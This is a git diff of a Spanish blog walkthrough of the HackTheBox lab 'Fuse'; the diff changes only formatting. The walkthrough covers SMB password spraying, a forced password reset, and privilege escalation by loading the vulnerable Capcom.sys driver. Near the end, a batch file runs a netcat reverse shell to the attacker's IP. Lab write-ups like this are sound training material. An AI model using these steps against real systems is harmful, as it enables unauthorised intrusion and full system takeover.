@@ -1,8 +1,10 @@
 ---
 layout      : post
 title       : "HackTheBox - Fuse"
+author      : lanz
 image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/fuse/bannerfuse.png
 category    : [ htb ]
+tags        : [ windows-privileges, VStudio, SMB ]
 ---
 Máquina Windows nivel medio. Usaremos varios usuarios como diccionario para encontrar uno valido en el sistema, estando dentro explotaremos un permiso que nos deja subir drivers, subiremos uno conocido que tiene vulnerabilidades, aprovecharemos eso para lograr ejecución remota de comandos como Administrador. Debemos cambiarle claramente cosas al exploit por lo tanto debe ser compilado.
 
@@ -22,17 +24,17 @@ Con sus credenciales enumerando `rpcclient` encontraremos una contraseña guarda
 
 Como casi siempre tendremos 3 fases.
 
-1. [Enumeración](#enumeración)
-2. [Explotación](#explotación)
-3. [Escalada de privilegios](#escalada-de-privilegios)
+1. [Enumeración](#enumeracion).
+2. [Explotación](#explotacion).
+3. [Escalada de privilegios](#escalada-de-privilegios).
 
 ...
 
-## Enumeración. {#enumeración}
+## Enumeración. {#enumeracion}
 
 Empezamos obteniendo que puertos tiene activos la maquina. Usaremos `nmap` (:
 
-```sh
+```bash
 $ nmap -p- --open -T4 -Pn -v 10.10.10.193 -oG initScant
 ```
 
@@ -54,13 +56,13 @@ Ahora, con la función que creo [s4vitar](https://s4vitar.github.io/) podemos ex
 
 ![extractPorts](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png)
 
-```sh
+```bash
 $ extractPorts initScan
 ```
 
 Ahora que tenemos los puertos, haremos un escaneo para validar que versión y scripts maneja cada uno.
 
-```sh
+```bash
 nmap -p53,80,135,139,445,636,3268,49667 -sC -sV 10.10.10.193
 ```
 
@@ -97,7 +99,7 @@ Acá tambien se nos lista el FQDN y otro host `hostmaster` que anotaremos por si
 
 Cuando ponemos la ip nos redirecciona a `fuse.fabricorp.local/papercut/logs/html/index.htm`. Entonces podemos modificar nuestro archivo `$ /etc/hosts` indicandole que cuando hagamos una peticion a `10.10.10.193` nos de la respuesta de `fuse.fabricorp.local`.
 
-```sh
+```bash
 $ cat /etc/hosts
 127.0.0.1       localhost
 10.10.10.193    fuse.fabricorp.local
@@ -148,7 +150,7 @@ Al estar prácticamente estancado decidí pedir ayuda, me indicaron que probara 
 
 El tema con `html2dic` es que debemos hacer la extracción con cada página.
 
-```sh
+```bash
 $ curl -s http://fuse.fabricorp.local/papercut/logs/html/papercut-print-log-2020-05-29.htm > dic
 $ html2dic dic > dic.txt
 $ cat dic.txt | sort | uniq > dic.txt
@@ -162,20 +164,22 @@ $ ...
 
 Listo, ya teniendo los dos wordlist, podemos usar `CrackMapExec` hacia `SMB` para validar si obtenemos algo.
 
-```sh
+```bash
 $ cme smb 10.10.10.193 -u users.txt -p dic.txt
 ```
 
 ![bashcmepass](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/fuse/bashcmepass.png)
 
-## Explotación. {#explotación}
+...
+
+## Explotación. {#explotacion}
 
 Bien, obtenemos algo raro, pero al menos es diferente, nos indica que la password debe ser cambiada... Buscando con el error que nos sale, vemos varios foros, en uno de ellos hablan de `smbpasswd` y su flag `-r (remote)`, la cual nos permite cambiar la password de un usuario de SMB, pues nada, a probar :P.
 
-* [smbclient-says-nt-status-password-must-change-how-to-change-password](https://samba.samba.narkive.com/I0oDpMEz/smbclient-says-nt-status-password-must-change-how-to-change-password)
-* [FAILED-with-error-NT-STATUS-PASSWORD-MUST-CHANGE](http://samba.2283325.n4.nabble.com/FAILED-with-error-NT-STATUS-PASSWORD-MUST-CHANGE-td2445714.html)
+* [smbclient-says-nt-status-password-must-change-how-to-change-password](https://samba.samba.narkive.com/I0oDpMEz/smbclient-says-nt-status-password-must-change-how-to-change-password).
+* [FAILED-with-error-NT-STATUS-PASSWORD-MUST-CHANGE](http://samba.2283325.n4.nabble.com/FAILED-with-error-NT-STATUS-PASSWORD-MUST-CHANGE-td2445714.html).
 
-```sh
+```bash
 $ smbpasswd -r 10.10.10.193 -U 'bnielson'
 Old SMB password:
 New SMB password:
@@ -185,9 +189,9 @@ Password changed for user bnielson
 
 ...
 
-> El escaneo inicial me dejo con dudas, ya que no vi algún puerto disponible para usar [`evil-winrm`](https://github.com/Hackplayers/evil-winrm) y podernos conectar con algunas credenciales de manera remota al pc. Por eso decidi hacer otro escaneo pero total, sin parametros ni nada, el resultado fue este:
+> El escaneo inicial me dejo con dudas, ya que no vi algún puerto disponible para usar [evil-winrm](https://github.com/Hackplayers/evil-winrm) y podernos conectar con algunas credenciales de manera remota al pc. Por eso decidi hacer otro escaneo pero total, sin parametros ni nada, el resultado fue este:
 
-```sh
+```bash
 $ nmap -p- --open -vvv 10.10.10.193
 ```
 
@@ -197,7 +201,7 @@ Y si, varios puertos que no habíamos visto, entre ellos uno para el mantenimien
 
 La password que le asigne es **Estaes01**. Pero al ser un usuario al que todos deben de cambiar la contraseña, pues cada **x** segundos nuestra password deja de funcionar, así que o somos rápidos o crearemos un script (realmente intente hacer el script pero no lo logre, si alguien sabe como jugar con los inputs de cada comando hábleme y me enseña por favor), así que fui rápido :P, posteriormente usaremos `crackmapexec` para ver a que recursos tenemos acceso y con `smbget` nos descargaremos el recurso a nuestra máquina para ya olvidarnos de cambiar contraseñas y todo ese rollo :)
 
-```sh
+```bash
 $ cme smb 10.10.10.193 -u bnielson -p Estaes001 --shares
 ...
 #Vemos varios recursos, `print$` y `SYSVOL` son interesantes, descargemos los dos
@@ -207,7 +211,7 @@ $ smbget -R smb://10.10.10.193/print$ -U bnielson
 
 > ¿Por que SYSVOL es importante?, generalmente se usa un script para cambiar la contraseña del admin local, necesario para cumplir las **gpp (Preferencias de politica de grupo)**, ese script esta guardado en la ruta `SYSVOL` y a menudo en texto claro. 
 
-* [Video de s4vitar explicando SYSVOL.](https://www.youtube.com/watch?v=bFmBBgncY4o&t=1768) 
+* [Video de s4vitar explicando SYSVOL](https://www.youtube.com/watch?v=bFmBBgncY4o&t=1768).
 
 ![bashcmepass](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/fuse/bashcmepass.png)
 
@@ -217,7 +221,7 @@ El directorio `SYSVOL` nos da un error, al parecer hay un archivo al cual no ten
 
 Podemos usar `smbclient` para entrar en el directorio `/SYSVOL` e intentar descargar desde ahí los archivos. Así mismo podemos usar `rpcclient` para con las nuevas credenciales ver que podemos encontrar (de los comandos que encontré, pude obtener otro conjunto de usuarios, pero nada más).
 
-```sh
+```bash
 $ smbclient //10.10.10.193/SYSVOL -U bnielson
 
 recurse ON # Carpetas y subcarpetas
@@ -247,6 +251,8 @@ Listo, vemos que tenemos el mismo acceso que `bnielson`, probemos de una con `ev
 
 Ahoraaaa a enumerar.
 
+...
+
 ## Escalada de privilegios. {#escalada-de-privilegios}
 
 Si hacemos búsquedas de servicios o software corriendo no obtenemos nada, subiendo [**winPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) y/o [**PowerUp.ps1**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) tampoco, ni enumerando carpetas y subcarpetas tenemos algo... Solamente en el directorio raíz tenemos un `readme.txt` y una carpeta `/test`.
@@ -263,8 +269,8 @@ El privilegio `SeLoadDriverPrivilege` nos permite subir un driver al kernel, por
 
 En nuestro caso tenemos el privilegio ya activado, por lo tanto solo nos queda la explotación. Hay dos buenos post para guiarse:
 
-* Español - [Tarlogic](https://www.tarlogic.com/blog/explotacion-de-la-directiva-cargar-y-descargar-controladores-de-dispositivo-seloaddriverprivilege/)
-* Ingles - [HackTricks](https://book.hacktricks.xyz/windows/active-directory-methodology/privileged-accounts-and-token-privileges#seloaddriverprivilege)
+* [Español - Tarlogic](https://www.tarlogic.com/blog/explotacion-de-la-directiva-cargar-y-descargar-controladores-de-dispositivo-seloaddriverprivilege/).
+* [Ingles - HackTricks](https://book.hacktricks.xyz/windows/active-directory-methodology/privileged-accounts-and-token-privileges#seloaddriverprivilege).
 
 Usando el código del `NTLoadDriver.cpp` podemos intentar subir el driver [**Capcom.sys**](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys).
 
@@ -275,7 +281,7 @@ Nos indica que usa dos argumentos:
 
 Muy bien, sabiendo esto, démosle al `NTLoadDriver`, obteniendo el SID de `svc-print` vemos esto:
 
-```sh
+```powershell
 PS> Get-ADUser -Identity 'svc-print' | select SID
 
 S-1-5-21-2633719317-1471316042-3957863514-1104
@@ -285,11 +291,11 @@ Lo siguiente es compilar o buscar los binarios, para posteriormente subirlos a l
 
 La compilación y la ejecución parecen estar bien, pero no obtengo ningún output... Estuve modificando y buscando otras maneras pero no encontré, le tuve que volver a pedir ayuda a [**TazWake**](https://www.hackthebox.eu/profile/49335) moderador HTB y un duro en seguridad. Me indico que el no había hecho ese procedimiento, que había usado un ejecutable de [**VbScrub**](https://www.hackthebox.eu/profile/158833). El cual también nos permite subir un driver pasándole los dos parámetros del **NTLoadDriver**. Además me recalco el posible uso de AV en toda la maquina menos en la carpeta **test** de la raíz (Este era el **spoiler**, ya que antes estaba guardando y ejecutando todo en otra carpeta).
 
-* Herramienta de VbScrub: [VbLoadDriver](https://github.com/VbScrub/VbLoadDriver)
+* [Herramienta de VbScrub: VbLoadDriver](https://github.com/VbScrub/VbLoadDriver).
 
 Y pasandole los mismos parametros de antes, su uso seria:
 
-```sh
+```powershell
 > VbLoadDriver.exe HKU\S-1-5-21-2633719317-1471316042-3957863514-1104\System\CurrentControlSet\Services\Capcom C:\test\Capcom.sys
 ```
 
@@ -299,7 +305,7 @@ Listo, logramos ejecutar correctamente el binario. Ahora solo nos queda hablar s
 
 Existe una utilidad llamada [**ExploitCapcom**](https://github.com/tandasat/ExploitCapcom) ¿Bastante intuitiva no?. Pues lo que tenemos que indicarle es (aunque lo intente sin las 2 primeras linea y me funciono igual :P):
 
-```sh
+```powershell
 > sc.exe create Capcom type= kernel binPath= C:\test\Capcom.sys
 > sc.exe start Capcom
 > ./ExploitCapcom.exe
@@ -311,7 +317,7 @@ Listo, conociendo su uso debemos modificar esta porcion de codigo:
 
 Para llegar a esa solución tuve muchos (muchos) intentos fallidos y básicamente fue por no parar y buscar sobre la función que ejecuta el comando en el sistema.
 
-* Documentación de Microsoft sobre [**CreateProcess()**](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa).
+* [Documentación de Microsoft sobre **CreateProcess()**](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa).
 
 Apoyándome en esa descripción, es que entendí que debía indicarle como primer parámetro (nombre de la aplicación): `NULL`, ya que estamos en la consola y no estoy ejecutando ninguna aplicación... Y en el segundo parámetro (linea de comando) si dejar la petición de la revshell.
 
@@ -325,7 +331,7 @@ Después caí en cuenta que para evitar tantas compilaciones, sencillamente hubi
 
 Creamos el archivo:
 
-```sh
+```bash
 > echo "@echo off" > retrievemagic.bat
 > echo "C:\test\nc.exe 10.10.15.35 4433 -e cmd.exe" >> retrievemagic.bat
 ```
@@ -340,7 +346,7 @@ He creado un script para la subida y ejecución de los archivos... El único pro
 
 El problema está en la herramienta (winrm) o en la línea de ejecución del script, ya que tomando el mismo comando y usándolo dentro de la sesión de PowerShell de `evilwinrm` ta todo bien y se ejecuta correctamente.
 
-* Acá el autopwn: [autopwn_fuse.sh](https://github.com/lanzt/blog/tree/main/assets/scripts/HTB/fuse/autopwn_fuse.sh)
+* Acá el autopwn: [autopwn_fuse.sh](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/fuse/autopwn_fuse.sh).
 
 ...
 
